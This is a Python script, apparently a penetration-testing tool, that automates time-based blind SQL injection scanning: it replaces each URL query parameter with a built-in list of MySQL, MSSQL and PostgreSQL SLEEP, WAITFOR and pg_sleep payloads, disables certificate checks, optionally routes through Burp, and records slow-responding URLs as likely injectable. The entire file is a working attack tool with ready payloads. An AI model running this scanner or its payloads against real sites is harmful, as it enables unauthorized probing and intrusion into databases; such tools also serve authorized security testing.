#!/usr/bin/env python3
# made with <3 by akr3ch
# https://github.com/akr3ch

import os
import requests
import argparse
import sys
import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Define command-line arguments
parser = argparse.ArgumentParser(description="Time based SQL Injection automation script")
parser.add_argument('-u', '--url', help="Target URL")
parser.add_argument('-f', '--file', help="File containing URLs, one per line")
parser.add_argument('-p', '--payloads', help="File containing SQLi payloads, one per line")
parser.add_argument('--proxy', help="Burp Suite proxy (e.g. http://localhost:8080)")
args = parser.parse_args()

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(message)s')

# Set up proxies
proxies = None
if args.proxy:
    proxies = {
        "http": args.proxy,
        "https": args.proxy
    }

# default time based sqli payload
default_payloads = [
    "XOR(if(now()=sysdate(),sleep(5),0))OR'",
    "if(now()=sysdate(),sleep(5),0)",
    "(select(0)from(select(sleep(5)))v)/*'+(select(3)from(select(sleep(5)))v)+'\"+(select(0)from(select(sleep(5)))v)+\"*/",
    "'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z",
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))YYYY) AND '%%'='",
    "1'XOR(if(now()=sysdate(),sleep(5),0))OR'",
    "1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-1337",
    "1 or sleep(5)#",
    "' WAITFOR DELAY '0:0:5'--",
    "%%';SELECT PG_SLEEP(5)--",
    "pg_sleep(5)",
    "'| |pg_sleep(5)--"
]

payloads = []
if args.payloads:
    with open(args.payloads, 'r') as file:
        payloads = file.read().splitlines()

if not payloads:
    payloads = default_payloads

# Read URLs from file or command line
urls = []
if args.url:
    urls.append(args.url)
elif args.file:
    with open(args.file, 'r') as f:
        urls = f.read().splitlines()

# Test each URL with each payload
with open("sqli-found.txt", "w") as f:
    for url in urls:
        for payload in payloads:
            for parameter in url.split("?")[1].split("&"):
                parameter_name, parameter_value = parameter.split("=")
                new_url = url.replace(parameter_value, payload)
                logging.info("Testing: " + new_url)
                try:
                    response = requests.get(new_url, proxies=proxies, verify=False)
                    if response.elapsed.total_seconds() >= 5:
                        logging.warning("\033[31mPossible SQLi: " + new_url + "\033[0m")
                        f.write(new_url + "\n")
                except Exception as e:
                    logging.error(f"Error testing {new_url}: {e}")
